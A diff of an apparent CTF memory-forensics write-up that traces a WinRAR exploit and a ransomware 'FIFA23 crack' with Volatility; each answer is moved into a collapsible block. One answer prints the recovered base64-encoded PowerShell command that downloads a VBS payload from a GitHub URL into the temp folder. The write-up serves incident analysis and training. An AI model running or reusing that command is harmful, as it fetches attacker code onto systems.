@@ -26,25 +26,31 @@ Read about this [vulnerability](https://blog.securelayer7.net/analysis-of-cve-20
 We got vmem file as an evidence file and volatility 3 to analyze this memory file
 ![09ef290ea8c7c033669c8ca073e0f9c4.png](/resources/09ef290ea8c7c033669c8ca073e0f9c4.png)
 used plugin `windows.pstree` to show process tree, there are 2 WinRAR.exe under explorer.exe which matchs name and scenario of this challenge.
-```
-WinRAR.exe
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>WinRAR.exe</code></pre>
+</details>
 
 > We suspect that the crack had another name. Can you find the old name of that crack?
 
 ![0d0ddecbe55f92369ebc6500246934c6.png](/resources/0d0ddecbe55f92369ebc6500246934c6.png)
 used `windows.cmdline` plugin, you can see that winrar was used to open suspicious rar file.
-```
-b6wzzawS.rar
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>b6wzzawS.rar</code></pre>
+</details>
 
 > What is the new crack filename?
 
 ![aabee5c11b91d7945920d18a714b2528.png](/resources/aabee5c11b91d7945920d18a714b2528.png)
 I used filescan plugin piped into text file then filter with Downloads folder, you can see that there is 1 suspicious rar file there and its FIFA23CRACK which make sense since Fifa23 is a football game.
-```
-FIFA23CRACK.rar
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>FIFA23CRACK.rar</code></pre>
+</details>
 
 > What is the command that executed the remote request?
 
@@ -58,17 +64,21 @@ Then I used 7z to extract those file out
 First file is PNG file in disguise which also make sense because in this CVE, user needed to click ReadMe.txt first then malicious command inside cmd file will be executed
 ![90d42cb211ae8617e58f3754ad5bbcbe.png](/resources/90d42cb211ae8617e58f3754ad5bbcbe.png)
 Here is the malicious powershell command 
-```
-powershell.exe -EncodedCommand SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Vsc2ZhN0VsNGEyeS9TZWNyZXRXZWFwL21haW4vU2Q0cUF4MjEudmJzJyAtT3V0RmlsZSAiJGVudjpURU1QXFNkNHFBeDIxLnZicyI=
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>powershell.exe -EncodedCommand SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Vsc2ZhN0VsNGEyeS9TZWNyZXRXZWFwL21haW4vU2Q0cUF4MjEudmJzJyAtT3V0RmlsZSAiJGVudjpURU1QXFNkNHFBeDIxLnZicyI=</code></pre>
+</details>
 
 > The external link has a username. What is it?
 
 ![e4f5480e544a040200fa7072aff627c5.png](/resources/e4f5480e544a040200fa7072aff627c5.png)
 Decode base64 strings, you can see that this is a command to download vbs script from github
-```
-Elsfa7El4a2y
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>Elsfa7El4a2y</code></pre>
+</details>
 
 > It seems the creator of that ransomware uploaded a file to the cloud. Can you find which domain it was downloaded from?
 
@@ -84,9 +94,11 @@ come back to replace, we need to know which strings to be replace and what is th
 Use Find / Replace recipe on Cyberchef, we got Hex
 ![7c2f7ee1ac6012a86d52b1cf82956e29.png](/resources/7c2f7ee1ac6012a86d52b1cf82956e29.png)
 Then use From Hex, We finally got an url
-```
-download850.mediafire.com
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>download850.mediafire.com</code></pre>
+</details>
 
 > The attacker left the file behind in someplace to come back later for the device. What is the full location of this file?
 
@@ -94,9 +106,11 @@ download850.mediafire.com
 You can see that there is .savetofile function here with Reverse string and replace string, that string also look like base64 too
 ![15ebf5eb7a19e70eed02fe6098f1a885.png](/resources/15ebf5eb7a19e70eed02fe6098f1a885.png)
 We can use Find / Replace with From Base64 to decode, the result is the file that was created to stay persistence. 
-```
-c:\windows\temp\B4cKL4T3R.bat
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>c:\windows\temp\B4cKL4T3R.bat</code></pre>
+</details>
 
 * * *
 ## Summary
